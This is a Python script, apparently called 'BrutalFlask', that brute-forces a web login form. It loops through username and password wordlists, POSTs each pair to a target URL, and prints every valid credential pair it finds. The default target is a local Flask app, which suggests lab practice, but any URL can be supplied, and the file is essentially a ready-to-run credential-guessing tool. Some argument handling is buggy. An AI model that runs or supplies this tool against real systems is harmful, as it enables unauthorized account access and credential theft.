import requests
import time
from datetime import datetime
import sys
import argparse
import re

# The default arguments if the user doesn't specify any of the arguments
TARGET_URL = "http://127.0.0.1:8088/login"
USERNAMES_FILE = "usernames.txt"
PASSWORDS_FILE = "passwords.txt"

arg_parser = argparse.ArgumentParser(description=f"{sys.argv[0]}'s argument parser.")

arg_parser.add_argument("-t", "--target-url", help="The target url.", default=TARGET_URL, required=True)
arg_parser.add_argument("-u", "--usernames-file", help="The file containing the list of usernames.", default=USERNAMES_FILE)
arg_parser.add_argument("-p", "--passwords-file", help="The file containing the list of passwords.", default=PASSWORDS_FILE)
arg_parser.add_argument("-vr", "--valid-login-regex", help="The regex for check if the login was succesful.", default="Welcome [^.!]|^((?!Invalid|account locked).)*$", required=False)
arg_parser.add_argument("-c", "--continue-if-found", help="Continue brute forcing after a valid login is found and not the end of the list.", default=1, required=False)
arg_parser.add_argument("-d", "--delay", help="The number of second(s) to wait before the next attempt.", default=0.5)

args, unknowns = arg_parser.parse_known_args()

delay = float(args.delay)
continue_if_found = False

if args.continue_if_found.lower() == "true":
    continue_if_found = True

print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]ℹ️BrutalFlask v1.0 initiated.")
print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]ℹ️Now loading usernames and passwords files.")

# Load the usernames and passwords
with open(args.usernames_file) as users_file:
    usernames = [ username.strip() for username in users_file]

with open(args.passwords_file) as password_file:
    passwords = [ password.strip() for password in password_file]

print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]ℹ️Files are now loaded.")

number_of_attempts = 0
response = ""
valid_login_regex = re.compile(args.valid_login_regex, re.IGNORECASE)
isFound = False
valid_logins = {}

# Perform the brute forcing
for username in usernames:
    for password in passwords:
        response = requests.post(args.target_url, data = { "username" : username, "password" : password})
    
        number_of_attempts += 1 

        # If there is a match based on the valid login regex, then show the valid login credentials and then store it for later user.
        if valid_login_regex.search(response.text):
            print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}][# of Attempts: {number_of_attempts}]✅Valid login credentials found {username}:{password}")
            
            isFound = True
            valid_logins[username] = password

            # Move on to the next username on list
            break

        print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}][# of Attempts: {number_of_attempts}]❌ Log in failed for {username}:{password}.")

        # Wait x seconds specificed by delay before trying again.
        time.sleep(delay)

    # Stop brute forcing if decided not to after the first valid login credentials was found. 
    if isFound and not continue_if_found:
        break

# If there were any valid login credentials found, then show valid login credentials.
if not isFound:
    print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]ℹ️No valid login credentials were found.")
else:
    # Show the valid login credentials that were found.
    print(f"[{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}]ℹ️The following valid login credentials were found:")

    for username in valid_logins:
        print(f"\t\t\t{username}:{valid_logins[username]}")
